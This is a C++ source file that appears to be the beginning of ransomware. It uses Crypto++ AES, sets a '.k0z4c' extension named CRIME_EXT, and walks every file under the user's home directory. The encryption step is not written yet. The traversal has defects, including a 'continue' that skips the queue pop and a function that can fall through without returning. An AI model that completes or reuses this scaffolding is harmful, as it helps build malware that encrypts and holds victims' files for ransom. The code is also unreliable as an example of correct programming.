#include "cryptlib.h"
#include "rijndael.h"
#include "modes.h"
#include "files.h"
#include "osrng.h"
#include "hex.h"

#include<filesystem>
#include<iostream>
#include<list>
#include<queue>
#include<string>

namespace fs = std::filesystem;
using namespace CryptoPP;
using namespace std;

const char CRIME_EXT[] = ".k0z4c";

auto printErr = [](const char* msg)
  { cout << "[x] " << msg << endl; };

class Node {

  list<fs::path>::iterator curr;
  
  public:
    list<fs::path> links;
    fs::path value;
    bool is_visited;
    
    Node(fs::path p){
      value = p;
      curr = links.begin();
      is_visited = false;
    }
    
    fs::path getLink(){
      if(curr != links.end())
        return *curr;
    }
    
    void loadLinks(){
      if(is_directory(value))
        for (const auto & link : fs::directory_iterator(value))
          links.push_back(link);
    }
};

typedef Node FsObj;

int main(int argc, char** argv){

  fs::path entryPoint = getenv("HOME");
  FsObj curr = FsObj(entryPoint);
  queue<FsObj> q; q.push(curr);
  

  // let's init the fucking keys and a pseudo random number generator
  AutoSeededRandomPool prng;
  HexEncoder encoder(new FileSink(std::cout));
  SecByteBlock key(AES::DEFAULT_KEYLENGTH);
  SecByteBlock iv(AES::BLOCKSIZE);
  
  while(!q.empty()){
    //cout << "the size of the queue " << q.size() << endl;
    curr = q.front();
    //cout << "extracted " << curr.value << endl;
    if(curr.is_visited) continue;
    
    curr.is_visited = true;
    curr.loadLinks();
    for(auto & link : curr.links)
       q.push(link);
    q.pop();
  }
  return 0;
}
